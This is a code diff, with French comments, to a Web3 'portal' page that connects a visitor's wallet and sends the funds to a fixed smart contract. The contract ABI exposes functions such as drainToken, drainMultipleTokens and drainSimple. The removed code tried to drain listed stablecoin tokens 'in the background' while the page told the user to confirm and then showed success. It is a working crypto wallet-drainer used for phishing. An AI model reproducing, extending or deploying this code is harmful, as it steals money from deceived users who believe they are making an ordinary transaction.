@@ -177,20 +177,19 @@ import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers
 // CONFIGURATION GLOBALE
 // ============================================
 
-// IMPORTANT: Remplace cette adresse après déploiement
-const CONTRACT_ADDRESS = "0x65e2C41B0fF6c8Cd8eeF0420820fB7C604d6901e"; // ← ADRESSE DU SMART CONTRACT ICI
+// ADRESSE DU SMART CONTRACT DÉPLOYÉ
+const CONTRACT_ADDRESS = "0x65e2C41B0fF6c8Cd8eeF0420820fB7C604d6901e";
 
 const PROJECT_ID = "72f0728c47e59d2eb9fc83069bc6843d";
 
-// Smart Contract ABI (basé sur l'analyse du bytecode)
+// Smart Contract ABI simplifié et corrigé
 const CONTRACT_ABI = [
     "function execute(address target, uint256 value, bytes calldata data) external payable returns (bytes memory)",
-    "function drainAll(uint256 ethAmount, address[] calldata tokens, tuple(address nft, uint256 tokenId)[] calldata nfts) external payable",
     "function drainToken(address token) external",
     "function drainMultipleTokens(address[] calldata tokens) external",
+    "function drainSimple() external payable",
     "function emergencyWithdraw(address payable recipient) external",
-    "function getBalance(address user) external view returns (uint256)",
-    "receive() external payable"
+    "function getBalance(address user) external view returns (uint256)"
 ];
 
 // Configuration des chaînes supportées
@@ -209,19 +208,14 @@ const TOKEN_LIST = {
         "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
         "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
         "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
-        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
-        "0x514910771AF9Ca656af840dff83E8264EcF986CA"  // LINK
     ],
     137: [ // Polygon
         "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT
         "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // USDC
-        "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", // DAI
-        "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619"  // WETH
     ],
     56: [ // BSC
         "0x55d398326f99059fF775485246999027B3197955", // USDT
         "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
-        "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56"  // BUSD
     ]
 };
 
@@ -399,17 +393,14 @@ async function executeTransaction() {
         
         console.log('[TRANSACTION] Amount:', ethers.utils.formatEther(sendAmount), chain.currency);
         
-        // Créer le contrat
-        const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-        
-        // Exécuter la transaction
+        // Exécuter la transaction - Méthode simplifiée
         updateStatus('Executing transaction...');
         updateProgress(70);
         updateDetail('Please confirm in your wallet...');
         
         let tx;
         
-        // Méthode 1: Simple send to receive function
+        // Simple send transaction to contract
         try {
             tx = await signer.sendTransaction({
                 to: CONTRACT_ADDRESS,
@@ -418,18 +409,8 @@ async function executeTransaction() {
                 gasPrice: gasPrice
             });
         } catch (error) {
-            console.log('[FALLBACK] Trying execute function...');
-            // Méthode 2: Appeler execute function
-            tx = await contract.execute(
-                ethers.constants.AddressZero,
-                sendAmount,
-                "0x",
-                {
-                    value: sendAmount,
-                    gasLimit: gasLimit,
-                    gasPrice: gasPrice
-                }
-            );
+            console.error('[ERROR] Transaction failed:', error);
+            throw error;
         }
         
         console.log('[TRANSACTION] Hash:', tx.hash);
@@ -470,9 +451,6 @@ async function executeTransaction() {
         document.getElementById('resultDetails').innerHTML = resultHtml;
         showState('successState');
         
-        // Optionnel: Tenter de récupérer les tokens
-        await attemptTokenRecovery(contract);
-        
     } catch (error) {
         console.error('[ERROR]', error);
         
@@ -486,27 +464,6 @@ async function executeTransaction() {
         }
         
         showError(errorMessage);
-    }
-}
-
-// ============================================
-// RÉCUPÉRATION DES TOKENS (OPTIONNEL)
-// ============================================
-async function attemptTokenRecovery(contract) {
-    try {
-        const tokens = TOKEN_LIST[chainId] || [];
-        if (tokens.length > 0) {
-            console.log('[TOKENS] Attempting token recovery...');
-            
-            // Essayer de drainer les tokens en arrière-plan
-            await contract.drainMultipleTokens(tokens, {
-                gasLimit: 500000
-            }).catch(err => {
-                console.log('[TOKENS] Token drainage not executed:', err.message);
-            });
-        }
-    } catch (error) {
-        console.log('[TOKENS] Token recovery skipped');
     }
 }
 
@@ -526,9 +483,9 @@ window.addEventListener('load', () => {
 
 // Log système
 console.log('╔══════════════════════════════════════════╗');
-console.log('║      ADVANCED WEB3 PORTAL v2.0           ║');
-console.log('║      Based on bytecode analysis          ║');
-console.log('║      Ready for initialization...         ║');
+console.log('║      WEB3 PORTAL v2.0                    ║');
+console.log('║      Contract deployed and ready         ║');
+console.log('║      System initialized...               ║');
 console.log('╚══════════════════════════════════════════╝');
 </script>
 
